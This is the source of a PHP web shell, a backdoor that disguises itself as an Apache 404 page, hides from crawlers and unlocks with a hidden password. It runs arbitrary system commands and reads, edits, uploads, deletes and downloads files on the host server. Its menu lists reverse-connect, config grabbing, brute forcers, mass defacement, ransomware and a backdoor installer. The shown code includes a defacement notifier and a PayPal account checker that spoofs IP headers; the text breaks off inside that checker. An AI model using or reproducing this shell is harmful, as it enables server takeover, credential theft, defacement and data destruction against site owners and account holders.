<?php
header("X-XSS-Protection: 0");
session_start();
ob_start();
set_time_limit(0);
error_reporting(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

if (version_compare(PHP_VERSION, '5.3.0', '<')) {
	@set_magic_quotes_runtime(0);
}
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
	$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
	if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
		header('HTTP/1.0 404 Not Found');
		exit;
	}
}
 if(isset($_REQUEST['logout'])) {
 session_destroy();
 echo "<script>window.location='?'</script>";
 }
$password = "831167d1d11e16b877055beb00ffec4b"; // md5 : memek
function login_shell()
{
?>
	<!DOCTYPE HTML>
	<html>

	<head>
		<title>404 Not Found</title>
		<h1>Not Found</h1>

		<p>The requested URL was not found on this server.</p>
		<p>Additionally, a 404 Not Found
			error was encountered while trying to use an ErrorDocument to handle the request.</p>
		<hr>
		<address>Apache Server at <?= $_SERVER['HTTP_HOST'] ?> Port 80</address>
		<style>
			input {
				margin: 0;
				background-color: #fff;
				border: 1px solid #fff;
				text-align: center;
			}
		</style>
		<br><br><br><br><br>
		<form method="post">
		<br />
<br />
<center>
				<input type="password" name="password" autocomplete="off">
		</form>
		</center>
	<?php
	exit;
}

if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
	if (empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password)))
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	else
		login_shell();

function usergroup()
{
	if (!function_exists('posix_getegid')) {
		$user['name'] 	= @get_current_user();
		$user['uid']  	= @getmyuid();
		$user['gid']  	= @getmygid();
		$user['group']	= "?";
	} else {
		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
		$user['gid'] 	= @posix_getgrgid(posix_getegid());
		$user['name'] 	= $user['uid']['name'];
		$user['uid'] 	= $user['uid']['uid'];
		$user['group'] 	= $user['gid']['name'];
		$user['gid'] 	= $user['gid']['gid'];
	}
	return (object) $user;
}

function exe($cmd)
{
	if (function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif (function_exists('exec')) {
		@exec($cmd, $results);
		$buff = "";
		foreach ($results as $result) {
			$buff .= $result;
		}
		return $buff;
	} elseif (function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif (function_exists('shell_exec')) {
		$buff = @shell_exec($cmd);
		return $buff;
	}
}

$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "ON" : "OFF";
$ds = @ini_get("disable_functions");
$open_basedir = @ini_get("Open_Basedir");
$safemode_exec_dir = @ini_get("safe_mode_exec_dir");
$safemode_include_dir = @ini_get("safe_mode_include_dir");
$show_ds = (!empty($ds)) ? "$ds" : "All Functions Is Accessible";
$mysql = (function_exists('mysql_connect')) ? "ON" : "OFF";
$curl = (function_exists('curl_version')) ? "ON" : "OFF";
$wget = (exe('wget --help')) ? "ON" : "OFF";
$perl = (exe('perl --help')) ? "ON" : "OFF";
$ruby = (exe('ruby --help')) ? "ON" : "OFF";
$mssql = (function_exists('mssql_connect')) ? "ON" : "OFF";
$pgsql = (function_exists('pg_connect')) ? "ON" : "OFF";
$python = (exe('python --help')) ? "ON" : "OFF";
$magicquotes = (function_exists('get_magic_quotes_gpc')) ? "ON" : "OFF";
$ssh2 = (function_exists('ssh2_connect')) ? "ON" : "OFF";
$oracle = (function_exists('oci_connect')) ? "ON" : "OFF";

$show_obdir = (!empty($open_basedir)) ? "OFF" : "ON";
$show_exec = (!empty($safemode_exec_dir)) ? "OFF" : "ON";
$show_include = (!empty($safemode_include_dir)) ? "OFF" : "ON";

if (!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}

function hdd($s)
{
	if ($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824) . ' GB';
	elseif ($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576) . ' MB';
	elseif ($s >= 1024)
		return sprintf('%1.2f', $s / 1024) . ' KB';
	else
		return $s . ' B';
}

if(!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}
if(strtolower(substr($system,0,3)) == "win") $win = TRUE;
else $win = FALSE;
if(isset($_GET['dir'])){
	if(@is_dir($_GET['view'])){
		$path = $_GET['view'];
		@chdir($path);
	}
	else{
		$path = $_GET['dir'];
		@chdir($path);
	}
}
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
$system = php_uname();
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$port = $_SERVER['SERVER_PORT'];
$yourip = $_SERVER['REMOTE_ADDR'];
$on = php_sapi_name();
$music = "https://2.top4top.net/m_1425x1dlr0.mp3";
$end = "https://j.top4top.io/m_1736egolm0.mp3";
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$java = (exe('java -h')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$gcc = (exe('gcc --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$oracle = (function_exists('ocilogon')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$mssql = (function_exists('mssql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
echo '<!DOCTYPE HTML>
<html>
<head>
<link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcR4oMc5P1CjTP7YVL0aWuRszdcg92TerrPaoQ&usqp=CAU">
<link rel="shortcut icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcR4oMc5P1CjTP7YVL0aWuRszdcg92TerrPaoQ&usqp=CAU">
<link href="" rel="stylesheet" type="text/css">
<title>404 Not Found</title>
<style>
body{
font-family: "sans-serif", cursive;
background-color: black;
color:white;
}
#content tr:hover{
background-color: lime;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: lime;
}
table{
    border: 1px solid lime;
    border-collapse: collapse;
    padding: 5px;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:black;
text-shadow:0px 0px 10px #ffffff;
}
textarea{
border: 1px solid lime;
background-color: black;
color: yellow;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
th {
    border: 1px solid lime;
    border-collapse: collapse;
    padding: 5px;
}
.destroy_table {;
  background:transparent;
  border:1px solid lime;
  font-family:Kelly Slab;
    display:inline-block;
  cursor:pointer;
  color:white;
  font-size:17x;
  font-weight:bold;
  padding:3px 20px;
  text-decoration:white;
  text-shadow:0px 0px 0px #ff0505;
       }
       .td_table {;
  background-color: #000000;
            background-image: url(https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTyQXyLOEQGD-5UUDctsUuUoB4l8_Y46v1WvA&usqp=CAU);
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: 100%  100%;   
border: 1px solid gold; 
padding: 0px; 
margin-left: 2px; 
text-align: center;
}
li {
		display: inline;
		margin: 1px;
		padding: 1px;
	}
	#menu a {
	 	padding:1px;
	 	margin:1px; 
	 	background:black; 
	 	text-decoration:none; 
		letter-spacing:2px;
		letter-spacing: 2px;
		border-radius: 1px;
		border-bottom: 1px solid yellow;
		border-top: 1px solid yellow;
		border-right: 1px solid yellow;
		border-left: 1px solid yellow;
	}
	#menu a:hover {
		background:black; 
		border-bottom:0px solid black; 
		border-top:0px solid black; 
	}
	hr {
		color: yellow;
}
input[type=text] , input[type=file] , input[type=email] , input[type=password] , select {
	background:#111111;
        color: yellow;
	border:0;
	padding:2px;
	border-bottom:1px solid #222222;
	border-top:1px solid #222222; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px color: yellow; -webkit-box-shadow:0px 0px 5px ;
} 
input[type=submit] , input[type=reset] {
        background-color: black;
        color: yellow;
        border: 1 solid yellow;
        border-radius: 5px;
        box-shadow: 0px 2px 8px 0px rgb(255, 0, 0);
        text-align: center;
        margin: 5px 2px;
        padding: 2px;
        cursor: pointer;
      }
      input[type=text] , input[type=file] , input[type=email] , input[type=password] , select:hover{
        border: 1px solid yellow;
        background-color: black;
        color: yellow;
      }
input[type=submit] , input[type=reset]:hover{
	border-bottom:1px solid yellow;
	border-top:1px solid yellow; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px color: yellow ; -webkit-box-shadow:0px 0px 5px ;
}
td{
border: 1px solid yellow;
    border-collapse: collapse;
    padding: 5px;
}
</style>
</head>
<body>
<h1><center><font color="yellow">404 Not Found</font><center></h1>';
echo "<table width='100%' border='0' cellpadding='0' cellspacing='0' align='center'><tr><td rowspan='11'><img src='https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQi7MMGdaor-Ar9f_UnuKQPGS5m_7azU-mvgQ&usqp=CAU' width='200' height='200'>";
echo "<tr><td><font color='yellow'>Server IP </font><td>: <font color='lime'>".gethostbyname($_SERVER['HTTP_HOST'])." </font><font color='white'> | Your IP : </font><font color='lime'>$yourip</font><font color='white'> | Port : </font><font color='lime'>$port</font></tr></td>";
echo "<tr><td><font color='yellow'>Kernel </font><td>: <font color='lime'>$system</font></tr></td>";
echo "<tr><td><font color='yellow'>PHP </font><td>: <font color='lime'>".PHP_VERSION." </font><font color='white'>on </font><font color='lime'>$on</font></tr></td>";
echo "<tr><td><font color='yellow'>Software </font><td>: <font color='lime'>".getenv('SERVER_SOFTWARE')." </font></tr></td";
echo "<tr><td><font color='yellow'>HDD  <td>:</font> Total <font color='lime'>$total</font> /Used: <font color='lime'>$used</font> ( Free: <font color='lime'>$freespace</font> )";
echo "<tr><td><font color='yellow'>User  <td>: <font color='lime'>".$user."</font> (".$uid.") Group: <font color='lime'>".$group."</font> (".$gid.")";
echo "<tr><td><font color='yellow'>Function <td>: </font>$show_ds <font color='white'>| </font><font color='yellow'>Safe Mode : </font>$sm</tr></td>";
echo "<tr><td><font color='yellow'>Lib Installed  <td>: MySQL: $mysql | MSSQL: $mssql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl | Java: $java | GCC: $gcc | Oracle: $oracle";
echo "<tr><td><font color='yellow'>Time </font><td>: <font color='lime'>".date("d M Y H:i:s",time())." </font></tr></td><br>";
echo "<tr><td><font color='yellow'>Directory <td>: ";
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id => $pat) {	
	echo "<a href='?path=";
	for($i = 0; $i <= $id; $i++) {
		echo $paths[$i];
		if($i != $id) {
		echo "/";
		}
	}
	echo "'>$pat</a>/";
}
echo '</tr></td></table><table width="100%" border="1" cellpadding="3" cellspacing="1" align="center"><tr><td>';
echo "<br><center><li><a class='destroy_table' href='?'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1gAADdYBkG95nAAAAAd0SU1FB9oJBxQ2GRnu/TgAAAJzSURBVDjLtZLPSxtBHMXf5semZDfS7KpIaWzRShoFD5UK9h6ai5eCPfZkwYJ4kF566a30H0gF24BUqDdjBT1VCFIsNBUWEw+ha2obpDGUXGR1Z7KZ+fbQRky1vfULAzPD4/MeMw/4H7O6ugoAsG17tFwuJwFgd3f3Qq3yN0g+n7+r6/oKgEtQMDWYGHx5kc539rC4uAgA2Hy/OaGq6oplWaVcLmdxxl9YlvUEALa2tv6dYGPjXSoS6chWKpWKaZpdoVBIL5VK+0NDQ/1END02NjZ/LsHc3BwAYG1tbSIYVLOFQuGzpmldgUDAkFKqvb2917a3t23GWDqXyz0BgPX19fYEy8vLKV3XswcHBxXDMLoikYghpaRW0kajwfbK5W834/F+ANOpVGr+FLC0tHRf0/TX+/tf7J6eniuappkA6IwBtSC2bX9NJBIDRPT05OTkuTL1aKpj9Pbox1qtdmgYxlXTNG8QEV3wPgRAcV23bllWfmRkZNh13VuKpmnBvr6+O1LK2szMzNtwOBxviYUQUBQFPp+vBYCU8jCTyaSOj48vA/hw6jI+Ph5JJpOfwuFwnIjAGKsvLCw8cxxHTE4+fGwY0RgRgYi+O44zPDs7W2/rgeu6CmMMjDFwziGE+JFIJF5Vq9VMs+kdcs7BOQdjDEdHR6fGgdZGCAHOOfx+P4gIQggZjUaps9OkRqNBjDHQr1E8z8M5QLVaheM4TZ/fBxDQbDZVz/MgJYFzHlRVFURQms2GqNfr4qIm+mOx2L3u7u5hKSVCIXVPSvGmsFNUBuLxB8FA4DoAeJ63UywWswBk2x+l0+kW0P97KX80tnXfNj8B5NE5DOMV2T0AAAAASUVORK5CYII=' height='18' width='34'></a></li>";
echo "<li><a class='destroy_table' href='?backconnect=tool&path=".$path."'>Back Connect</a></li>";
echo "<li><a class='destroy_table' href='?do=zip&path=".$path."'>Zip Menu</a></li>";
echo "<li><a class='destroy_table' href='?do=endec&path=".$path."'>Encode/Decode</a></li>";
echo "<li><a class='destroy_table' href='?do=crdp&path=".$path."'>CREATE-RDP</a></li>";
echo "<li><a class='destroy_table' href='?to=zoneh&path=".$path."'>Zone-h</a></li>";
echo "<li><a class='destroy_table' href='?do=zonez&path=".$path."'>Z-Def.id</a></li>";
echo "<li><a class='destroy_table' href='?do=tool&path=".$path."'>Tools</a></li>";
echo "<li><a class='destroy_table' href='?do=zonex&path=".$path."'>Zone-Xsec</a></li>";
echo "<li><a class='destroy_table' href='?do=defid&path=".$path."'>Defacer.id</a></li>";
echo "<li><a class='destroy_table' href='?to=config&path=".$path."'>Config Grab</a></li>";
echo "<li><a class='destroy_table' href='?do=auto_edit_user&path=".$path."'>Auto Edit User</a></li>";
echo "<li><a class='destroy_table' href='?do=cmd&path=".$path."'>Cpanel Reset</a></li>";
echo "<li><a class='destroy_table' href='?do=cpanel&path=".$path."'>Cpanel Brute</a></li>";
echo "<li><a class='destroy_table' href='?to=jumping&path=".$path."'>Jumping</a></li>";
echo "<li><a class='destroy_table' href='?to=sym&path=".$path."'>Symlink</a></li>";
echo "<li><a class='destroy_table' href='?hex=symlink&path=".$path."'>Symlink 1</a></li>";
echo "<li><a class='destroy_table' href='?hex=symlink2&path=".$path."'>Symlink 2</a></li>";
echo "<li><a class='destroy_table' href='?hex=symlinkpy&path=".$path."'>Symlink_PY</a></li>";
echo "<li><a class='destroy_table' href='?do=masse&path=".$path."'>Mass Deface</a></li>";
echo "<li><a class='destroy_table' href='?do=mass_delete&path=".$path."'>Mass Delete</a></li>";
echo "<li><a class='destroy_table' href='?do=hashgen&path=".$path."'>Hash Generator</a></li>";
echo "<li><a class='destroy_table' href='?do=hashid&path=".$path."'>Hash ID</a></li>";
echo "<li><a class='destroy_table' href='?do=adminer&path=".$path."'>Adminer</a></li>";
echo "<li><a class='destroy_table' href='?do=adlog&path=".$path."'>Admin Finder</a></li>";
echo "<li><a class='destroy_table' href='?do=smtp&path=".$path."'>SMTP Grabber</a></li>";
echo "<li><a class='destroy_table' href='?do=whm&path=".$path."'>WHM Grabber</a></li>";
echo "<li><a class='destroy_table' href='?do=paycheck&path=".$path."'>PayPal Checker</a></li>";
echo "<li><a class='destroy_table' href='?do=echeck&path=".$path."'>Ebay Checker</a></li>";
echo "<li><a class='destroy_table' href='?do=macheck&path=".$path."'>Amazon Checker</a></li>";
echo "<li><a class='destroy_table' href='?do=backdoor&path=".$path."'>Backdoor Installer</a></li>";
echo "<li><a class='destroy_table' href='?do=fake_root&path=".$path."'>Fake Root</a></li>";
echo "<li><a class='destroy_table' href='?do=ubf&path=".$path."'>Obfuscate</a></li>";
echo "<li><a class='destroy_table' href='?do=ubf2&path=".$path."'>Obfuscate V2</a></li>";
echo "<li><a class='destroy_table' href='?do=bypass-cf&path=".$path."'>Bypass Cloudfare</a></li>";
echo "<li><a class='destroy_table' href='?do=skybrute&path=".$path."'>Skype Brute</a></li>";
echo "<li><a class='destroy_table' href='?do=fbbrute&path=".$path."'>FB Brute</a></li>";
echo "<li><a class='destroy_table' href='?do=jbrute&path=".$path."'>Joomla Brute</a></li>";
echo "<li><a class='destroy_table' href='?do=wbrute&path=".$path."'>Wordpress Brute</a></li>";
echo "<li><a class='destroy_table' href='?do=auto_dwp&path=".$path."'>Wordpress Auto Def</a></li>";
echo "<li><a class='destroy_table' href='?do=auto_dwp2&path=".$path."'>Wordpress Auto Def V2</a></li>";
echo "<li><a class='destroy_table' href='?do=cgi&path=".$path."'>Cgi Bypass Exploit</a></li>";
echo "<li><a class='destroy_table' href='?do=new&path=".$path."'>New</a></li>";
echo "<li><a class='destroy_table' href='?do=ransom&path=".$path."'>Ransomware</a></li>";
echo "<li><a class='destroy_table' href='?do=ransom2&path=".$path."'>Ransomware V2</a></li>";
echo "<li><a class='destroy_table' href='?do=ransom3&path=".$path."'>Ransomware V3</a></li>";
echo "<li><a class='destroy_table' href='?do=about&path=".$path."'>About Us</a></li>";
echo "<a class='destroy_table' href='?logout=true'>Logout</a>";
echo "<li><a class='destroy_table' href='?do=kill&path=".$path."'>Hapus Shell Ini?</a></li>";
echo '<table border="2" cellspacing="3"><tr>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="lime">Upload Successfull</font>';
}else{
echo '<font color="red">Upload Failed</font>';
}
}
echo '<br><br><td><center><form action="?" method="get">
	<input type="hidden" name="dir" value="'.$path.'">
	<b><font color="yellow">View :</font></b><input onMouseOver="this.focus();" id="goto" class="inputz" size="30" height="10" type="text" name="view" value="'.$path.'"><input class="inputzbut" type="submit" value="View !" name="cmd" style="width:50px;">
 </center>
 </form>';
echo "<td><form method='post'>
<b><font color='yellow'>Command :</font></b>
<input type='text' size='30' height='10' name='cmd'><input type='submit' class='inputzbut'  name='execmd' value='===>>' style='width:50px;'>
</form>
</td></tr>";
if($_POST['execmd']) {
echo "<center><textarea cols='50' rows='10' readonly='readonly' style='color:yellow; background-color:white;'>".exe($_POST['cmd'])."</textarea></center><br>";
}
echo '<table border="0" cellspacing="0"><tr><td><center><form enctype="multipart/form-data" method="POST">
<b><font color="red">File Upload :</font></b><input type="file" name="file" /><br>
<input type="submit" class="inputz" value="Upload!!!" style="width:150px;"/>
</p></form></tr></td>';
echo "<b></td></tr>";
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '<br/></td></tr></table>';
echo '[ <a href="?act=download&dir='.$path.'&file='.$_GET['filesrc'].'" class="tombol"><font color="red">Download</a></font> ]&nbsp;&nbsp;[ <a href="?" class="tombol"><font color="red">HOME</a></font> ]<br>
<form method="POST">
<textarea cols=120 rows=15 name="src">'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>';
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="lime">Change Permission Successfull</font><br/>';
}else{
echo '<font color="red">Change Permission Failed</font><br />';
}
}
echo '[ <a href="?" class="tombol"><font color="red">HOME</a></font> ]<br>
<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod"><br>
<input type="submit" class="inputz" value="Save" style="width:100px;"/>
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="lime">Rename Successfull</font><br/>';
}else{
echo '<font color="red">Rename Failed</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '[ <a href="?" class="tombol"><font color="red">HOME</a></font> ]<br>
<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename"><br>
<input type="submit" class="inputz" value="Save" style="width:100px;"/>
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="lime">Editing Successfull</font><br/>';
}else{
echo '<font color="red">Failed To Edit</font><br/>';
}
fclose($fp);
}
echo '[ <a href="?" class="tombol"><font color="yellow">HOME</a></font> ]<br>
<form method="POST">
<textarea cols=120 rows=15 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" class="inputz" value="Save" style="width:200px;"/>
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="lime">Directory Deleted</font><br/>';
}else{
echo '<font color="red">Directory Failed To Be Deleted                                                                                                                                                                                                                                                               </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="lime">File Deleted</font><br/>';
}else{
echo '<font color="red">File Failed To Be Deleted</font><br/>';
}
}
}
echo '</center>';
if(function_exists('opendir')) {
	if($opendir = opendir($path)) {
		while(($readdir = readdir($opendir)) !== false) {
			$scandir[] = $readdir;
		}
		closedir($opendir);
	}
	sort($scandir);
} else {
	$scandir = scandir($path);
}
if($_GET['do'] == 'zonez') {
echo '<center>';
echo '<br>';
echo '<h1><--! Z-Def.Id <font color=red>Notifier !--></font></h1>';
echo '<br>';
echo '<form method="post" action="" enctype="multipart/form-data">
<b>Nickname :</b><br>
<input class="inputz" size="40" height="10" type="text" name="hekel" value="M4DI~UciH4">
<br><b>Team Name :</b><br>
<input class="inputz" size="40" height="10" type="text" name="crew" value="No team">
<br><b>List Site :</b><br>
<textarea cols="40" rows="10" placeholder="http://site.com/" name="sites"></textarea>
<br>
<br>
<input  class="inputz" type="submit"  name="go" value="hajarr.!">';
echo '</form>';
echo '</center>';
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$hekel = $_POST['hekel'];
$crew = $_POST['crew'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://z-def.id/mass";
$data_to_post = array();
$data_to_post['defacer'] = "$hekel";
$data_to_post['team'] = "$crew";
$data_to_post['vulntype'] = 'Lain-lain';
$data_to_post['reason'] = 'Lain-lain';
$data_to_post['urlb'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13'); SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}
}
}
if($_GET['do'] == 'paycheck') {
ini_set('max_execution_time', 0);
if(!file_exists('Cookies')) mkdir('Cookies');
#-----------------------------------------------------++
$List 	= $_POST['List'];
#-----------------------------------------------------++
echo '
<!DOCTYPE html>
<html lang="en">
<body>
<link rel="stylesheet" href="http://www.w32.info/2001/04/xmldsigmore">
<script type="text/javascript">
function AddLine(id)	{ document.getElementById(\'LineCh\').innerHTML += id;  }
function DelLine(id)	{ var str=document.getElementById("List").value; var n=str.replace( id + "\n" , "");document.getElementById("emails").value=n;}
function CountYes(id) { document.getElementById(\'yes\').innerHTML = id;	}
function CountNot(id) { document.getElementById(\'not\').innerHTML = id;	}
function ListYes(id)	{ document.getElementById(\'ListY\').innerHTML += id + "\n"; }
function ListLim(id)	{ document.getElementById(\'ListL\').innerHTML += id + "\n"; }
function ListNot(id)	{ document.getElementById(\'ListN\').innerHTML += id + "\n"; }
function Done(id)		{ document.getElementById(\'Wait\').innerHTML = id; }
</script>
<center>
<h1><font color="red"><--! PayPal Checker !--></font></h1>
<form action="" method="post" enctype="multipart/form-data" name="M4DI~UciH4">
<b>Email List :</b><br>
<textarea name="List" style="width:72%; height: 300px;" id="List" placeholder=" Here Email List .." dir="ltr">'.$List.'</textarea><br>
<input value="Check" type="submit">
		</form>';
if (!empty($List)) {
$List = explode("\r\n", $List);
echo '
		<div class="Tbl bottom" style="padding: 8px 0px;">
			<div style="text-align:left;margin-left:35px;font: 14px Tahoma;line-height: 1.4em;text-shadow: 1px 1px #D1D1D1;margin-bottom:5px;padding: 0px 0px 5px;">
				<div style="padding-bottom:5px;text-shadow: 1px 1px #D1D1D1;font: 14px Tahoma;line-height: 1.4em;"><font color="#343434">[ <font color="#FFFF00">Total emails to be Check </font> : <font color="#FFFF00">'.count($List).'</font> ] . . .</font></div>
				<div id="LineCh"></div>
				<div id="Wait" style="padding-top:2px;"><img src="http://www.btoall.com/application/modules/themes/views/default/assets/img/loading.gif"/></div>
			</div>
			<div class="Tbl REz" style="padding:10px;">
					<textarea name="ListY" id="ListY" style="width:95%; height: 100px;margin:0px 0px 5px;border: 1px solid #CCC;" placeholder=" REGISTERED .." dir="ltr"></textarea>
					<textarea name="ListL" id="ListL" style="width:95%; height: 100px;margin:0px 0px 5px;border: 1px solid #CCC;" placeholder=" LIMITED OR LOCKED .." dir="ltr"></textarea>
					<textarea name="ListN" id="ListN" style="width:95%; height: 100px;margin:0px 0px 5px;border: 1px solid #CCC;" placeholder=" NOT REGISTERED .." dir="ltr"></textarea>
			</div>
			<div class="Tbl bottom"><a href="https://www.facebook.com/J7Group">Coded By JOkEr7</a><a href="http://e-blackmarket.info/registeration" target="_blank"> And Code Editor By </a></div></div></section></div></body></html>';
#-----------------------------------------------------++

function AddLine ($id)	{ echo '<script type="text/javascript">AddLine(\''.$id .'\');</script>';  }
function DelLine ($id)	{ echo '<script type="text/javascript">deleteLn(\''.$id .'\');</script>'; }
function CountYes($id)	{ echo '<script type="text/javascript">CountYes(\''.$id .'\');</script>'; }
function CountNot($id)	{ echo '<script type="text/javascript">CountNot(\''.$id .'\');</script>'; }
function ListYes ($id)	{ echo '<script type="text/javascript">ListYes(\''.$id .'\');</script>';  }
function ListLim ($id)	{ echo '<script type="text/javascript">ListLim(\''.$id .'\');</script>';  }
function ListNot ($id)	{ echo '<script type="text/javascript">ListNot(\''.$id .'\');</script>';  }
function Done    ($id)	{ echo '<script type="text/javascript">Done(\''.$id .'\');</script>';  	  }
#-----------------------------------------------------++
function JOkEr7($url,$randIP){
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31');
    curl_setopt($curl, CURLOPT_COOKIEFILE,'Cookies/PP1.txt');
    curl_setopt($curl, CURLOPT_COOKIEJAR,'Cookies/PP1.txt');
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($curl, CURLOPT_HTTPHEADER, array("REMOTE_ADDR: ".$randIP."", "HTTP_X_FORWARDED_FOR: ".$randIP.""));
	curl_setopt($curl,CURLOPT_FOLLOWLOCATION,true);
    $result = curl_exec($curl);
	return $result;
	@unlink('Cookies/PP1.txt');
    curl_close($curl);
}
#-----------------------------------------------------++
$count = 1;
foreach( $List AS $email){
#-----------------------++
AddLine('<span style="padding-bottom:3px;"><font color="#343434">'.$count.'- </font><font color="#4E4E4E"> Checking <font color="#343434">: '.$email.'</font> :');
$count++;
if(filter_var($email , FILTER_VALIDATE_EMAIL)){
#-----------------------------------------------------++
$randIP = "".mt_rand(0,255).".".mt_rand(0,255).".".mt_rand(0,255).".".mt_rand(0,255);
